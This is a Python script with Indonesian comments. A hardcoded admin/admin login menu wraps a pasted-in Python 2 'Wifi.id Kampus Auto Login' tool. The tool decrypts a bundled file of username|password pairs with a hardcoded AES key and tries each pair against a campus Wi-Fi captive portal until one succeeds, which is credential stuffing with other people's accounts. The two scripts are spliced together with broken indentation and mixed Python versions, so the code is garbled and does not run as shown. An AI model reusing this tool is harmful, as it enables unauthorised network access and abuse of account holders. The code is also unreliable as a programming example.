#tools by St4rs
#Jangan edit selain username+password
#recode gk bikin lo jadi mastah


from getpass import getpass
import os
import time

def menu():
      while True:
           print("")
           os.system("clear")
           os.system("figlet -f slant '   Wifi-Id' | lolcat")
           print('\033[1;96m ============================================================')
           print(' ||  +--------------------------------------------------+  ||')
           print(' ||  | Creator   : Bintang Nur Pradana                  |  ||')
           print(' ||  +--------------------------------------------------+  ||')
           print(' ||  | Youtube   : https://youtube.com/xnxx             |  ||')
           print(' ||  | github    : https://github.com/bintangnurpradana |  ||')
           print(' ||  | WhatsApp  : 081329896085                         |  ||')
           print(' ||  | Team      : Garuda Terisakti 72                  |  ||')
           print(' ||  +--------------------------------------------------+  ||')
           print(' ============================================================')
           print("")
           try:
                x = str(input('\033[1;92m [?] Username \033[1;93m: '))
                print("")
                e = getpass('\033[1;92m [?] Password \033[1;93m: ')
                print ("")
#silahkan ganti username+passwordnya gan
                if x=="admin" and e=="admin":
#jangan edit yg lain kalo gak mau eror
                   print('Login Sukses Mohon Tunggu Sebentar...')
                   time.sleep(1)
                   os.system('clear')
                   print('')
                   os.system('figlet Wifi-Id | lolcat')
                   print('\033[1;92m ────────────────────────────────|by Stars ')
                   print('uji coba cok')
                   #!/usr/bin/env python2

from sys import argv
from termcolor import colored, cprint
from random import shuffle
from time import sleep
from Crypto.Cipher import AES
from Crypto import Random
import requests as req
import re as gex

GEX_PATTERN = "\x76\x61\x72\x20\x75\x72\x6c\x78\x20\x20\x20\x20\x20\x20\x20\x20\x3d\x20\x27(.*?)\x27\x3b"
AES_KEY = "cPp\xb67[\x9d\x8a{O\xda\xe9N\x0e\xe1\x81\xb1\x10\xc2\xbc,\x1cVZj1\x88>\x02\x8a\xff\x91"
AES_BLOCK = AES.block_size
USER_AGENT = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.456.0 Safari/534.3"
SHUFFLE = 5 # Shuffling times default: 5

def find_uname_locale(uname):
    handle = uname.split('@')[1]
    name = uname.split('@')[0]

    if handle == "unej":
        name=name+"@komunitas.unej"
    elif handle == "umaha":
        name=name+"@komunitas.umaha"
    elif handle == "trisakti":
        name=name+"@komunitas.trisakti"
    elif handle == "itdel":
        name=name+"@komunitas.itdel"
    elif handle == "polije":
        name=name+"@komunitas.polije"
    elif handle == "ut.ac.id":
        name=name+"@komunitas.ut"
    elif handle == "unsiq":
        name=name+"@komunitas.unsiq"
    else:
        name=name+"@freeMS.vmgmt"

    return name

def get_posturl(landing) :
    req_header = {'User-Agent' : USER_AGENT}
    try:
        req_main = req.get(landing,headers=req_header)
        url_post = gex.findall(GEX_PATTERN,req_main.text)[0]
    except IndexError:
        return None
    except req.exceptions.ConnectionError:
        print colored('[ERROR] ', 'red') + "Failed to connect! Please check your connection."
        exit()
    except req.exceptions.MissingSchema:
        print colored('[ERROR] ', 'red') + "Invalid protocol! Use http/https."
        exit()

    return url_post

def dec_file(ES,RAND,stream,key,block_size):
    AES_IV = RAND.new().read(block_size)
    AES = ES.new(key, ES.MODE_CBC,AES_IV)
    return AES.decrypt(stream)[16:]

print colored('[WELCOME]', 'white','on_red') + " @Wifi.id Kampus Auto Login v0.1"
print colored('[GITHUB]', 'white','on_blue') + "  https://github.com/radito\n"

url_landing = raw_input(colored('[INPUT]', 'yellow') + " Enter yout landing url (http/s): ")

print colored('[INFO] ', 'cyan') + "Finding post url ..."
post_url = get_posturl(url_landing)

if post_url == None:
    print colored('[ERROR] ', 'red') + "Couldn't find post url, please check your landing url!"
    exit()
else:
    print colored('[OK] ', 'green') + "Found the post url! (" + post_url[:120] + "...)"
    for query in post_url.split('?')[1].split('&'):
        param = query.split('=')
        print '    -> '+"["+colored(param[0],'green')+"]"+" "+param[1]

print colored('[INFO] ', 'cyan') + "Opening file ..."

try:
    fopen = open("assets/mergenc.txt","r")
except IOError as iox:
    print colored('[ERROR] ', 'red') + "Failed to open file ("+str(iox)+")"
    exit()

print colored('[INFO] ', 'cyan') + "Reading stream file ..."

fstream = dec_file(AES,Random,fopen.read(),AES_KEY,AES_BLOCK)
fstream_array = fstream.split('\n')
fopen.close()

print colored('[INFO] ', 'cyan') + "Total Account: "+ str(len(fstream_array))
print colored('[INFO] ', 'cyan') + "Shuffling account\n"

for i in range(0,SHUFFLE):
    shuffle(fstream_array) # Shuffle account to maximize a chance of getting logged in

print colored('[INFO] ', 'cyan') + "Logging in ..."
sleep(2)

for arr in fstream_array:
    try:
        payload = {
        "username": find_uname_locale(arr.split('|')[0]),
        "password": arr.split('|')[1],
        "landURL": ""
        }
        req_header = {'User-Agent' : USER_AGENT}

        rpost = req.post(post_url,data=payload,headers=req_header)
        jsons = rpost.json()

        if jsons['result']==1:
            print colored('[LOGIN SUKSES] ', 'green') + payload['username'] + " | Message = " + jsons['message']
            exit()
        else:
            print colored('[LOGIN GAGAL] ', 'red') + payload['username'] + " | Message = " + jsons['message']

    except IndexError:
        print colored('[ERROR] ', 'red') + "Skipping invalid account"
    except ValueError:
        print colored('[ERROR] ', 'red') + "Skipping invalid json response"
    except KeyboardInterrupt:
        print colored('\n[CTRL+C] ', 'yellow') + "Process Interrupted! Exiting."
        exit()
                else:
                      print("")
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     [!] Username/Password Salah")
                      time.sleep(2)
                      print("")
           except Exception:
                      
                      print("")
                      print("")
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     [!] Username/Password Salah")
                      time.sleep(2)
           except KeyboardInterrupt:
                      print("")
                      os.system('killall -9 com.termux/home/example2')
                      print("")
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     [!] Username/Password Salah")
                      time.sleep(2)
menu()
